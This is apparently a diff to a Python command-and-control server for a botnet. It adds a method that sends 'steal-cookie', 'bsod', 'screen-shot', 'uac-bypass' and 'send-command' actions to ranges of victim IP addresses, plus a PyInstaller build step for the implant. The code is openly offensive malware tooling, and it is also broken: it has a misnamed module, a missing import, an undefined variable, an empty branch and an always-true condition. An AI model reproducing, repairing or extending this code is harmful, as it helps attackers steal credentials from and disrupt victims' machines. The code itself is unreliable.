@@ -1,4 +1,7 @@
 import json
+import os
+import subprocesses
+import platform
 
 class C2:
     def __init__(self, sio):
@@ -13,6 +16,7 @@ class C2:
         self.sio.on('disconnect', self.on_disconect)
         self.sio.on('command', self.send_command)
         self.sio.on('result', self.get_result)
+        self.generate()
 
 
     def on_connect(self, sid, data):
@@ -70,3 +74,66 @@ class C2:
             json.dump(self.total_devices, f)
 
 
+    def payload(self, data):
+        payload_type = data['payload']
+        ip_range = data['ip']
+        ip_addresses = []
+
+        if "-" in ip_range:
+            sections = ip_range.split('.')
+
+            # For each section, handle the range if it exists
+            parsed_sections = []
+            for section in sections:
+                if '-' in section:
+                    start, end = map(int, section.split('-'))
+                    parsed_sections.append(range(start, end + 1))
+                else:
+                    parsed_sections.append([int(section)])
+
+            # Generate all combinations of the sections
+            all_ips = list(itertools.product(*parsed_sections))
+
+            # Convert the combinations to IP address strings
+            ip_addresses = ['.'.join(map(str, ip)) for ip in all_ips]
+                
+        else:
+            ip_list.append(ip_range)
+
+        if payload_type == "steal-cookie":
+            for ip in ip_addresses:
+                self.sio.emit('steal-cookie', {"ip": ip})
+            
+        if payload_type == "bsod":
+            for ip in ip_addresses:
+                self.sio.emit('bsod', {"ip": ip})
+        
+        if payload_type == "screen-shot":
+            for ip in ip_addresses:
+                self.sio.emit('screen-shot', {"ip": ip})
+        
+        if payload_type == "uac-bypass":
+            for ip in ip_addresses:
+                self.sio.emit('uac-bypass', {"ip": ip})
+        
+        if payload_type == "send-command":
+            for ip in ip_addresses:
+                self.sio.emit('send-command', {"ip": ip})
+
+
+    def generate(self, generate):
+        working_dir = os.getcwd() + '/docker-pyinstaller'
+        system = platform.system()
+        
+        if system == generate:
+            #normal
+
+        elif system == "Windows":
+            result = subprocesses.run(f'docker run -v "{working_dir}/src/" cdrx/pyinstaller-windows "pyinstaller test.py"', shell=True, capture_output=True)
+            print(result)
+
+        elif system == "Darwin" or "Linux":
+            result = subprocesses.run(f'docker run -v "{working_dir}/src/" cdrx/pyinstaller-linux "pyinstaller test.py"', shell=True, capture_output=True)
+            print(result)
+        
+        
